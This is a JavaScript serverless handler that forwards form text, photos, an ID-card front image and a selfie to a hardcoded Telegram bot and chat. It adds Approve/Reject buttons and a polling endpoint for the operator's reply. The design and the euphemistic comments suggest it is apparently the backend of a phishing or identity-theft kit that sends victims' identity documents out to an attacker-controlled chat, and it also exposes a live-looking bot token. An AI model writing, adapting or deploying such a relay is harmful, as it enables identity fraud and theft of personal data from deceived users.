const process = require('process');

// Keep secrets away from front-end visibility
const T_TOK = "8255479405:AAGR-uv_zY3Y9zZ7Zj62-B8XxJ9kV0wgXJ0";
const C_ID = "7618245658";

exports.handler = async (event, context) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Content-Type': 'application/json'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    try {
        // Handle Polling State via GET Request queries
        if (event.httpMethod === 'GET') {
            const { action } = event.queryStringParameters || {};
            if (action === 'getUpdates') {
                const url = `https://api.telegram.org/bot${T_TOK}/getUpdates?offset=-1`;
                const fetchRes = await fetch(url);
                const data = await fetchRes.json();
                return { statusCode: 200, headers, body: JSON.stringify(data) };
            }
        }

        // Handle Form/Data Submission Pipelines via POST Requests
        if (event.httpMethod === 'POST') {
            const body = JSON.parse(event.body);
            const { action } = body;

            if (action === 'sendMessage') {
                const url = `https://api.telegram.org/bot${T_TOK}/sendMessage?chat_id=${C_ID}&text=${encodeURIComponent(body.text)}`;
                const response = await fetch(url);
                const data = await response.json();
                return { statusCode: 200, headers, body: JSON.stringify(data) };
            }

            if (action === 'sendPhoto') {
                const formData = new FormData();
                formData.append('chat_id', C_ID);
                const blob = Buffer.from(body.photo, 'base64');
                formData.append('photo', new Blob([blob], { type: 'image/jpeg' }), 'photo.jpg');
                formData.append('caption', body.caption);

                const response = await fetch(`https://api.telegram.org/bot${T_TOK}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                return { statusCode: 200, headers, body: JSON.stringify(data) };
            }

            if (action === 'sendStructuredData') {
                // If present, send files safely upstream
                if (body.file1) {
                    await sendRawPhotoBuffer(body.file1, `ID/Front - ${body.currentUser}`);
                }
                if (body.file2) {
                    await sendRawPhotoBuffer(body.file2, `Selfie - ${body.currentUser}`);
                }

                // Append Inline Keyboard Verification Block
                const kb = {
                    "inline_keyboard": [[
                        { "text": "✅ Approve", "callback_data": "approve" },
                        { "text": "❌ Reject", "callback_data": "reject" }
                    ]]
                };

                const url = `https://api.telegram.org/bot${T_TOK}/sendMessage?chat_id=${C_ID}&text=${encodeURIComponent(body.message)}&parse_mode=Markdown&reply_markup=${encodeURIComponent(JSON.stringify(kb))}`;
                const response = await fetch(url);
                const data = await response.json();
                return { statusCode: 200, headers, body: JSON.stringify(data) };
            }
        }

        return { statusCode: 400, headers, body: JSON.stringify({ error: "Unsupported Request Action" }) };

    } catch (err) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: err.toString() }) };
    }
};

// Internal processing asset routine wrapper
async function sendRawPhotoBuffer(base64Str, caption) {
    const formData = new FormData();
    formData.append('chat_id', C_ID);
    const buffer = Buffer.from(base64Str, 'base64');
    formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'upload.jpg');
    formData.append('caption', caption);

    await fetch(`https://api.telegram.org/bot${T_TOK}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
}

